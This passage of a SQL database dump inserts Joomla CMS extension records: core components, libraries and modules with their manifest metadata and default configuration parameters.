INSERT INTO `hfa_extensions` VALUES (1,'com_mailto','component','com_mailto','',0,1,1,1,'{\"legacy\":false,\"name\":\"com_mailto\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_MAILTO_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(2,'com_wrapper','component','com_wrapper','',0,1,1,1,'{\"legacy\":false,\"name\":\"com_wrapper\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\n\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_WRAPPER_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(3,'com_admin','component','com_admin','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_admin\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\n\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_ADMIN_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(4,'com_banners','component','com_banners','',1,1,1,0,'{\"legacy\":false,\"name\":\"com_banners\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\n\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_BANNERS_XML_DESCRIPTION\",\"group\":\"\"}','{\"purchase_type\":\"3\",\"track_impressions\":\"0\",\"track_clicks\":\"0\",\"metakey_prefix\":\"\"}','','',0,'0000-00-00 00:00:00',0,0),(5,'com_cache','component','com_cache','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_cache\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_CACHE_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(6,'com_categories','component','com_categories','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_categories\",\"type\":\"component\",\"creationDate\":\"December 2007\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_CATEGORIES_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(7,'com_checkin','component','com_checkin','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_checkin\",\"type\":\"component\",\"creationDate\":\"Unknown\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2008 Open Source Matters. All rights reserved.\\n\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_CHECKIN_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(8,'com_contact','component','com_contact','',1,1,1,0,'{\"legacy\":false,\"name\":\"com_contact\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\n\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_CONTACT_XML_DESCRIPTION\",\"group\":\"\"}','{\"show_contact_category\":\"hide\",\"show_contact_list\":\"0\",\"presentation_style\":\"sliders\",\"show_name\":\"1\",\"show_position\":\"1\",\"show_email\":\"0\",\"show_street_address\":\"1\",\"show_suburb\":\"1\",\"show_state\":\"1\",\"show_postcode\":\"1\",\"show_country\":\"1\",\"show_telephone\":\"1\",\"show_mobile\":\"1\",\"show_fax\":\"1\",\"show_webpage\":\"1\",\"show_misc\":\"1\",\"show_image\":\"1\",\"image\":\"\",\"allow_vcard\":\"0\",\"show_articles\":\"0\",\"show_profile\":\"0\",\"show_links\":\"0\",\"linka_name\":\"\",\"linkb_name\":\"\",\"linkc_name\":\"\",\"linkd_name\":\"\",\"linke_name\":\"\",\"contact_icons\":\"0\",\"icon_address\":\"\",\"icon_email\":\"\",\"icon_telephone\":\"\",\"icon_mobile\":\"\",\"icon_fax\":\"\",\"icon_misc\":\"\",\"show_headings\":\"1\",\"show_position_headings\":\"1\",\"show_email_headings\":\"0\",\"show_telephone_headings\":\"1\",\"show_mobile_headings\":\"0\",\"show_fax_headings\":\"0\",\"allow_vcard_headings\":\"0\",\"show_suburb_headings\":\"1\",\"show_state_headings\":\"1\",\"show_country_headings\":\"1\",\"show_email_form\":\"1\",\"show_email_copy\":\"1\",\"banned_email\":\"\",\"banned_subject\":\"\",\"banned_text\":\"\",\"validate_session\":\"1\",\"custom_reply\":\"0\",\"redirect\":\"\",\"show_category_crumb\":\"0\",\"metakey\":\"\",\"metadesc\":\"\",\"robots\":\"\",\"author\":\"\",\"rights\":\"\",\"xreference\":\"\"}','','',0,'0000-00-00 00:00:00',0,0),(9,'com_cpanel','component','com_cpanel','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_cpanel\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_CPANEL_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(10,'com_installer','component','com_installer','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_installer\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_INSTALLER_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(11,'com_languages','component','com_languages','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_languages\",\"type\":\"component\",\"creationDate\":\"2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\n\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_LANGUAGES_XML_DESCRIPTION\",\"group\":\"\"}','{\"administrator\":\"en-GB\",\"site\":\"en-GB\"}','','',0,'0000-00-00 00:00:00',0,0),(12,'com_login','component','com_login','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_login\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_LOGIN_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(13,'com_media','component','com_media','',1,1,0,1,'{\"legacy\":false,\"name\":\"com_media\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_MEDIA_XML_DESCRIPTION\",\"group\":\"\"}','{\"upload_extensions\":\"bmp,csv,doc,gif,ico,jpg,jpeg,odg,odp,ods,odt,pdf,png,ppt,swf,txt,xcf,xls,BMP,CSV,DOC,GIF,ICO,JPG,JPEG,ODG,ODP,ODS,ODT,PDF,PNG,PPT,SWF,TXT,XCF,XLS\",\"upload_maxsize\":\"10\",\"file_path\":\"images\",\"image_path\":\"images\",\"restrict_uploads\":\"1\",\"allowed_media_usergroup\":\"3\",\"check_mime\":\"1\",\"image_extensions\":\"bmp,gif,jpg,png\",\"ignore_extensions\":\"\",\"upload_mime\":\"image\\/jpeg,image\\/gif,image\\/png,image\\/bmp,application\\/x-shockwave-flash,application\\/msword,application\\/excel,application\\/pdf,application\\/powerpoint,text\\/plain,application\\/x-zip\",\"upload_mime_illegal\":\"text\\/html\",\"enable_flash\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(14,'com_menus','component','com_menus','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_menus\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_MENUS_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(15,'com_messages','component','com_messages','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_messages\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_MESSAGES_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(16,'com_modules','component','com_modules','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_modules\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_MODULES_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(17,'com_newsfeeds','component','com_newsfeeds','',1,1,1,0,'{\"legacy\":false,\"name\":\"com_newsfeeds\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_NEWSFEEDS_XML_DESCRIPTION\",\"group\":\"\"}','{\"show_feed_image\":\"1\",\"show_feed_description\":\"1\",\"show_item_description\":\"1\",\"feed_word_count\":\"0\",\"show_headings\":\"1\",\"show_name\":\"1\",\"show_articles\":\"0\",\"show_link\":\"1\",\"show_description\":\"1\",\"show_description_image\":\"1\",\"display_num\":\"\",\"show_pagination_limit\":\"1\",\"show_pagination\":\"1\",\"show_pagination_results\":\"1\",\"show_cat_items\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(18,'com_plugins','component','com_plugins','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_plugins\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_PLUGINS_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(19,'com_search','component','com_search','',1,1,1,0,'{\"legacy\":false,\"name\":\"com_search\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\n\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_SEARCH_XML_DESCRIPTION\",\"group\":\"\"}','{\"enabled\":\"0\",\"show_date\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(20,'com_templates','component','com_templates','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_templates\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_TEMPLATES_XML_DESCRIPTION\",\"group\":\"\"}','{\"template_positions_display\":\"0\",\"upload_limit\":\"2\",\"image_formats\":\"gif,bmp,jpg,jpeg,png\",\"source_formats\":\"txt,less,ini,xml,js,php,css\",\"font_formats\":\"woff,ttf,otf\",\"compressed_formats\":\"zip\"}','','',0,'0000-00-00 00:00:00',0,0),(21,'com_weblinks','component','com_weblinks','',1,1,1,0,'{\"legacy\":false,\"name\":\"com_weblinks\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\n\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_WEBLINKS_XML_DESCRIPTION\",\"group\":\"\"}','{\"target\":\"0\",\"count_clicks\":\"1\",\"icons\":2,\"link_icons\":\"\",\"category_layout\":\"_:default\",\"show_category_title\":\"1\",\"show_description\":\"1\",\"show_description_image\":\"1\",\"maxLevel\":\"-1\",\"show_empty_categories\":\"0\",\"show_subcat_desc\":\"1\",\"show_cat_num_links\":\"1\",\"show_base_description\":\"1\",\"maxLevelcat\":\"-1\",\"show_empty_categories_cat\":\"0\",\"show_subcat_desc_cat\":\"1\",\"show_cat_num_links_cat\":\"1\",\"show_pagination_limit\":\"1\",\"show_headings\":\"0\",\"show_link_description\":\"1\",\"show_link_hits\":\"1\",\"show_pagination\":\"0\",\"show_pagination_results\":\"0\",\"show_feed_link\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(22,'com_content','component','com_content','',1,1,0,1,'{\"legacy\":false,\"name\":\"com_content\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_CONTENT_XML_DESCRIPTION\",\"group\":\"\"}','{\"article_layout\":\"_:default\",\"show_title\":\"1\",\"link_titles\":\"1\",\"show_intro\":\"1\",\"show_category\":\"0\",\"link_category\":\"1\",\"show_parent_category\":\"0\",\"link_parent_category\":\"0\",\"show_author\":\"0\",\"link_author\":\"0\",\"show_create_date\":\"0\",\"show_modify_date\":\"0\",\"show_publish_date\":\"0\",\"show_item_navigation\":\"0\",\"show_vote\":\"0\",\"show_readmore\":\"1\",\"show_readmore_title\":\"0\",\"readmore_limit\":\"100\",\"show_icons\":\"1\",\"show_print_icon\":\"1\",\"show_email_icon\":\"1\",\"show_hits\":\"0\",\"show_noauth\":\"0\",\"urls_position\":\"0\",\"show_publishing_options\":\"1\",\"show_article_options\":\"1\",\"show_urls_images_frontend\":\"1\",\"show_urls_images_backend\":\"1\",\"targeta\":0,\"targetb\":0,\"targetc\":0,\"float_intro\":\"left\",\"float_fulltext\":\"left\",\"category_layout\":\"_:blog\",\"show_category_title\":\"0\",\"show_description\":\"0\",\"show_description_image\":\"0\",\"maxLevel\":\"1\",\"show_empty_categories\":\"0\",\"show_no_articles\":\"1\",\"show_subcat_desc\":\"1\",\"show_cat_num_articles\":\"0\",\"show_base_description\":\"1\",\"maxLevelcat\":\"-1\",\"show_empty_categories_cat\":\"0\",\"show_subcat_desc_cat\":\"1\",\"show_cat_num_articles_cat\":\"1\",\"num_leading_articles\":\"0\",\"num_intro_articles\":\"4\",\"num_columns\":\"1\",\"num_links\":\"4\",\"multi_column_order\":\"0\",\"show_subcategory_content\":\"0\",\"show_pagination_limit\":\"1\",\"filter_field\":\"hide\",\"show_headings\":\"1\",\"list_show_date\":\"0\",\"date_format\":\"\",\"list_show_hits\":\"1\",\"list_show_author\":\"1\",\"orderby_pri\":\"order\",\"orderby_sec\":\"rdate\",\"order_date\":\"published\",\"show_pagination\":\"2\",\"show_pagination_results\":\"1\",\"show_feed_link\":\"1\",\"feed_summary\":\"0\",\"feed_show_readmore\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(23,'com_config','component','com_config','',1,1,0,1,'{\"legacy\":false,\"name\":\"com_config\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_CONFIG_XML_DESCRIPTION\",\"group\":\"\"}','{\"filters\":{\"1\":{\"filter_type\":\"NH\",\"filter_tags\":\"\",\"filter_attributes\":\"\"},\"9\":{\"filter_type\":\"BL\",\"filter_tags\":\"\",\"filter_attributes\":\"\"},\"6\":{\"filter_type\":\"BL\",\"filter_tags\":\"\",\"filter_attributes\":\"\"},\"7\":{\"filter_type\":\"NONE\",\"filter_tags\":\"\",\"filter_attributes\":\"\"},\"2\":{\"filter_type\":\"NH\",\"filter_tags\":\"\",\"filter_attributes\":\"\"},\"3\":{\"filter_type\":\"BL\",\"filter_tags\":\"\",\"filter_attributes\":\"\"},\"4\":{\"filter_type\":\"BL\",\"filter_tags\":\"\",\"filter_attributes\":\"\"},\"5\":{\"filter_type\":\"BL\",\"filter_tags\":\"\",\"filter_attributes\":\"\"},\"8\":{\"filter_type\":\"NONE\",\"filter_tags\":\"\",\"filter_attributes\":\"\"}}}','','',0,'0000-00-00 00:00:00',0,0),(24,'com_redirect','component','com_redirect','',1,1,0,1,'{\"legacy\":false,\"name\":\"com_redirect\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_REDIRECT_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(25,'com_users','component','com_users','',1,1,0,1,'{\"legacy\":false,\"name\":\"com_users\",\"type\":\"component\",\"creationDate\":\"April 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_USERS_XML_DESCRIPTION\",\"group\":\"\"}','{\"allowUserRegistration\":\"1\",\"new_usertype\":\"2\",\"guest_usergroup\":\"1\",\"sendpassword\":\"1\",\"useractivation\":\"0\",\"mail_to_admin\":\"0\",\"captcha\":\"recaptcha\",\"frontend_userparams\":\"1\",\"site_language\":\"0\",\"change_login_name\":\"0\",\"reset_count\":\"10\",\"reset_time\":\"1\",\"minimum_length\":\"4\",\"minimum_integers\":\"0\",\"minimum_symbols\":\"0\",\"minimum_uppercase\":\"0\",\"save_history\":\"0\",\"history_limit\":5,\"mailSubjectPrefix\":\"\",\"mailBodySuffix\":\"\"}','','',0,'0000-00-00 00:00:00',0,0),(27,'com_finder','component','com_finder','',1,1,0,0,'{\"legacy\":false,\"name\":\"com_finder\",\"type\":\"component\",\"creationDate\":\"August 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_FINDER_XML_DESCRIPTION\",\"group\":\"\"}','{\"show_description\":\"1\",\"description_length\":255,\"allow_empty_query\":\"0\",\"show_url\":\"1\",\"show_advanced\":\"1\",\"expand_advanced\":\"0\",\"show_date_filters\":\"0\",\"highlight_terms\":\"1\",\"opensearch_name\":\"\",\"opensearch_description\":\"\",\"batch_size\":\"50\",\"memory_table_limit\":30000,\"title_multiplier\":\"1.7\",\"text_multiplier\":\"0.7\",\"meta_multiplier\":\"1.2\",\"path_multiplier\":\"2.0\",\"misc_multiplier\":\"0.3\",\"stemmer\":\"snowball\"}','','',0,'0000-00-00 00:00:00',0,0),(28,'com_joomlaupdate','component','com_joomlaupdate','',1,1,0,1,'{\"legacy\":false,\"name\":\"com_joomlaupdate\",\"type\":\"component\",\"creationDate\":\"February 2012\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"COM_JOOMLAUPDATE_XML_DESCRIPTION\",\"group\":\"\"}','{\"updatesource\":\"sts\",\"customurl\":\"\"}','','',0,'0000-00-00 00:00:00',0,0),(29,'com_tags','component','com_tags','',1,1,1,1,'{\"legacy\":false,\"name\":\"com_tags\",\"type\":\"component\",\"creationDate\":\"March 2013\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.0.0\",\"description\":\"COM_TAGS_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(30,'com_contenthistory','component','com_contenthistory','',1,1,1,0,'{\"name\":\"com_contenthistory\",\"type\":\"component\",\"creationDate\":\"May 2013\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\\n\\t\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.2.0\",\"description\":\"COM_CONTENTHISTORY_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(31,'com_ajax','component','com_ajax','',1,1,1,0,'{\"name\":\"com_ajax\",\"type\":\"component\",\"creationDate\":\"August 2013\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.2.0\",\"description\":\"COM_AJAX_DESC\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(32,'com_postinstall','component','com_postinstall','',1,1,1,1,'','','','',0,'0000-00-00 00:00:00',0,0),(100,'PHPMailer','library','phpmailer','',0,1,1,1,'{\"legacy\":false,\"name\":\"PHPMailer\",\"type\":\"library\",\"creationDate\":\"2001\",\"author\":\"PHPMailer\",\"copyright\":\"(c) 2001-2003, Brent R. Matzelle, (c) 2004-2009, Andy Prevost. All Rights Reserved., (c) 2010-2011, Jim Jagielski. All Rights Reserved.\",\"authorEmail\":\"jimjag@gmail.com\",\"authorUrl\":\"https:\\/\\/code.google.com\\/a\\/apache-extras.org\\/p\\/phpmailer\\/\",\"version\":\"5.2\",\"description\":\"LIB_PHPMAILER_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(101,'SimplePie','library','simplepie','',0,1,1,1,'{\"legacy\":false,\"name\":\"SimplePie\",\"type\":\"library\",\"creationDate\":\"2004\",\"author\":\"SimplePie\",\"copyright\":\"Copyright (c) 2004-2009, Ryan Parman and Geoffrey Sneddon\",\"authorEmail\":\"\",\"authorUrl\":\"http:\\/\\/simplepie.org\\/\",\"version\":\"1.2\",\"description\":\"LIB_SIMPLEPIE_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(102,'phputf8','library','phputf8','',0,1,1,1,'{\"legacy\":false,\"name\":\"phputf8\",\"type\":\"library\",\"creationDate\":\"2006\",\"author\":\"Harry Fuecks\",\"copyright\":\"Copyright various authors\",\"authorEmail\":\"hfuecks@gmail.com\",\"authorUrl\":\"http:\\/\\/sourceforge.net\\/projects\\/phputf8\",\"version\":\"0.5\",\"description\":\"LIB_PHPUTF8_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(103,'Joomla! Platform','library','joomla','',0,1,1,1,'{\"legacy\":false,\"name\":\"Joomla! Platform\",\"type\":\"library\",\"creationDate\":\"2008\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"http:\\/\\/www.joomla.org\",\"version\":\"11.4\",\"description\":\"LIB_JOOMLA_XML_DESCRIPTION\",\"group\":\"\"}','{\"mediaversion\":\"fc07473445944202975f7278a160330b\"}','','',0,'0000-00-00 00:00:00',0,0),(104,'IDNA Convert','library','idna_convert','',0,1,1,1,'','','','',0,'0000-00-00 00:00:00',0,0),(105,'FOF','library','fof','',0,1,1,1,'{\"legacy\":false,\"name\":\"FOF\",\"type\":\"library\",\"creationDate\":\"2013-10-08\",\"author\":\"Nicholas K. Dionysopoulos / Akeeba Ltd\",\"copyright\":\"(C)2011-2013 Nicholas K. Dionysopoulos\",\"authorEmail\":\"nicholas@akeebabackup.com\",\"authorUrl\":\"https://www.akeebabackup.com\",\"version\":\"2.1.rc4\",\"description\":\"Framework-on-Framework (FOF) - A rapid component development framework for Joomla!\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(106,'PHPass','library','phpass','',0,1,1,1,'{\"legacy\":false,\"name\":\"PHPass\",\"type\":\"library\",\"creationDate\":\"2004-2006\",\"author\":\"Solar Designer\",\"authorEmail\":\"solar@openwall.com\",\"authorUrl\":\"http://www.openwall.com/phpass\",\"version\":\"0.3\",\"description\":\"LIB_PHPASS_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(200,'mod_articles_archive','module','mod_articles_archive','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_articles_archive\",\"type\":\"module\",\"creationDate\":\"July 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters.\\n\\t\\tAll rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_ARTICLES_ARCHIVE_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(201,'mod_articles_latest','module','mod_articles_latest','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_articles_latest\",\"type\":\"module\",\"creationDate\":\"July 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_LATEST_NEWS_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(202,'mod_articles_popular','module','mod_articles_popular','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_articles_popular\",\"type\":\"module\",\"creationDate\":\"July 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_POPULAR_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(203,'mod_banners','module','mod_banners','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_banners\",\"type\":\"module\",\"creationDate\":\"July 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_BANNERS_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(204,'mod_breadcrumbs','module','mod_breadcrumbs','',0,1,1,1,'{\"legacy\":false,\"name\":\"mod_breadcrumbs\",\"type\":\"module\",\"creationDate\":\"July 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_BREADCRUMBS_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(205,'mod_custom','module','mod_custom','',0,1,1,1,'{\"legacy\":false,\"name\":\"mod_custom\",\"type\":\"module\",\"creationDate\":\"July 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_CUSTOM_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 